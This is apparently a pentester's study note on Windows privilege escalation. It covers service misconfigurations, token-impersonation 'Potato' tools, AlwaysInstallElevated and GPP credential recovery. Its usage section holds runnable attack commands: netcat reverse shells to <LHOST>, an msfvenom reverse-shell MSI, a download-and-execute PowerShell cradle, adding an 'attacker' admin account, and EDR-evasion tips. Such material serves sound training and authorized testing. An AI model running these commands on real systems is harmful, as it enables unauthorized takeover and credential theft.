# 📌 Privilege Escalation - Windows

> Getting from a low-priv shell to SYSTEM or local/domain admin — through misconfigs, weak permissions, and token abuse.

---

## 🔍 Definition

Windows privilege escalation is the process of moving from a limited user account to a higher-privileged one (typically `NT AUTHORITY\SYSTEM` or local/domain Administrator) by exploiting misconfigurations, weak file/registry permissions, unpatched vulnerabilities, or abusing Windows features. The end goal in an AD engagement is usually local admin → domain admin via credential theft or lateral movement.

---

## 🧠 Core Concepts

- **SYSTEM** — highest local privilege. Equivalent to `root` on Linux. Runs kernel-level and many Windows services
- **Local Admin** — can modify local machine, install software, access local hashes. Often path to SYSTEM or domain hash theft
- **Token Impersonation** — Windows uses access tokens to determine process permissions. If a SYSTEM or admin-level process creates a token you can impersonate, you escalate
- **SeImpersonatePrivilege** — privilege that allows a process to impersonate other users. Commonly held by service accounts. Required for Potato attacks
- **SeAssignPrimaryTokenPrivilege** — similar to SeImpersonate, alternative for Potato attacks
- **Unquoted Service Path** — a service binary path with spaces but no quotes. Windows tries to execute intermediate path segments — if you can write there, you hijack execution
- **Writable Service Binary** — service runs a binary you have write access to — replace it with a payload
- **AlwaysInstallElevated** — registry keys that let any user install `.msi` files as SYSTEM. If both HKCU and HKLM are set to 1 → instant SYSTEM
- **GPP Credentials** — old Group Policy Preferences used to set local admin passwords via `Groups.xml` in SYSVOL. Password was AES encrypted with the key Microsoft published publicly. `gpp-decrypt` recovers it
- **DLL Hijacking** — a service/application loads a DLL that doesn't exist or exists in a writable path — place your DLL there

---

## ⚙️ Enumeration Flow

Always run WinPEAS first, then manually verify interesting findings.

```
Low-priv shell
    ↓
whoami /priv          # Check current privileges
systeminfo            # OS version, patches
net user; net localgroup
    ↓
.\winPEASx64.exe      # Run automated enum
    ↓
Review:
  - Services (unquoted paths, writable binaries)
  - Registry (AlwaysInstallElevated, AutoRuns)
  - Scheduled Tasks (writable scripts)
  - Stored credentials (cmdkey, GPP, config files)
  - Privileges (SeImpersonate, SeAssignPrimaryToken)
  - Kernel version (searchsploit, Windows Exploit Suggester)
```

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| WinPEAS | Windows Privilege Escalation Awesome Scripts — main automated enum tool |
| PowerUp.ps1 | PowerShell privesc enum script from PowerSploit |
| Seatbelt | GhostPack tool for system/user data gathering |
| JuicyPotato | Token impersonation exploit — needs SeImpersonatePrivilege. Doesn't work on Server 2019+ |
| PrintSpoofer | Potato-like exploit targeting the Print Spooler. Works on Server 2019/Win10+ |
| GodPotato | Newer Potato variant. Broad OS support including Server 2022 and Win11 |
| SweetPotato | Another modern Potato — supports IIS, WinRM, CI environments |
| Rubeus | Kerberos ticket manipulation (Windows-side) |
| accesschk.exe | Sysinternals tool to check object permissions |
| msfvenom | Payload generator for evil executables |

---

## 🔥 Important Details & Gotchas

- **SeImpersonatePrivilege is the most common privesc path** in service accounts (IIS, SQL, MSSQL). Always check this first with `whoami /priv`
- **JuicyPotato is dead on Windows Server 2019 and Win10 1809+** — use PrintSpoofer, GodPotato, or SweetPotato instead
- **AlwaysInstallElevated = free SYSTEM** if both registry keys are set. Check with: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- **Unquoted service paths require writable intermediate directory** — just because the path is unquoted doesn't mean you can exploit it. Verify write access with `icacls` or `accesschk.exe`
- **GPP credentials in SYSVOL** — check `\\<DC>\SYSVOL` for `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`. Even without domain creds, this may be readable
- **Scheduled tasks** — check for tasks running as SYSTEM that execute scripts in writable locations
- **AutoRun registry keys** — if a SYSTEM process runs something from a path you can write to, replace it
- **WinPEAS is noisy** — it will trigger EDR in real engagements. Use `winpeas.exe quiet` or specific flags in stealthy ops

---

## 🌍 Real-World Usage / Examples

**WinPEAS:**
```bash
# Upload to target, then:
.\winPEASx64.exe
.\winPEASx64.exe quiet     # less noise
.\winPEASx64.exe | findstr "WARNING Interesting"  # filter for high-priority

# Download latest from GitHub
certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe
```

**Check current privileges:**
```cmd
whoami /priv
whoami /groups
whoami /all
```

**SeImpersonatePrivilege → SYSTEM (PrintSpoofer):**
```cmd
.\PrintSpoofer64.exe -i -c cmd.exe
# Or: .\PrintSpoofer64.exe -c "nc <LHOST> 4444 -e cmd.exe"
```

**SeImpersonatePrivilege → SYSTEM (GodPotato — broadest support):**
```cmd
.\GodPotato.exe -cmd "cmd /c net localgroup administrators attacker /add"
.\GodPotato.exe -cmd "cmd /c nc <LHOST> 4444 -e cmd.exe"
```

**Unquoted Service Path:**
```cmd
# Find unquoted paths (PowerUp)
Get-UnquotedService

# Or manually:
wmic service get name,pathname,startmode | findstr /i /v """" | findstr /i /v C:\Windows

# Check if you can write to the intermediate directory
icacls "C:\Program Files (x86)\Vulnerable App"
# If (W) or (F) for your user → drop payload as the missing binary name
```

**AlwaysInstallElevated:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1 to exploit

# Generate .msi payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
# Install on target:
msiexec /quiet /qn /i evil.msi
```

**GPP Credentials:**
```bash
# From Kali (with domain creds):
crackmapexec smb <DC-IP> -u user -p pass -M gpp_password

# Find manually:
# \\<DC>\SYSVOL\<domain>\Policies\**\Groups.xml
# Look for cpassword field → decrypt:
gpp-decrypt <cpassword>
```

**PowerUp (PowerShell privesc enum):**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
Invoke-AllChecks
```

**Check service binary permissions:**
```cmd
accesschk.exe -uwcqv * /accepteula    # all services any user has write to
icacls "C:\path\to\service.exe"
```

**Kernel exploit (last resort):**
```bash
# Get sysinfo from target
systeminfo > sysinfo.txt

# Run Windows Exploit Suggester
python2 windows-exploit-suggester.py --systeminfo sysinfo.txt --database database.csv
```

---

## 🔗 Related Topics

- [[Active Directory (AD)]]
- [[NTLM and Pass-the-Hash]]
- [[Lateral Movement]]
- [[Kerberos Authentication]]
- [[BloodHound & Attack Path Analysis]]

---

## 📚 Sources / Further Reading

- [HackTricks — Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) — comprehensive reference
- [FuzzySecurity — Windows PrivEsc Fundamentals](https://fuzzysecurity.com/tutorials/16.html) — classic, detailed
- [StationX — Windows PrivEsc Guide (Dec 2025)](https://www.stationx.net/windows-privilege-escalation/) — current with Potato attack updates
- [Medium — Mastering Windows PrivEsc with Boxes (Nov 2025)](https://medium.com/@RootRouteway/breaking-boundaries-mastering-windows-privilege-escalation-with-boxes-1ec73145f972) — HTB/THM practical
- GodPotato: `https://github.com/BeichenDream/GodPotato`
- PrintSpoofer: `https://github.com/itm4n/PrintSpoofer`
- HTB Machines: `Bounty` (JuicyPotato), `Fuse` (SeLoadDriverPrivilege), `Butler` (unquoted path)
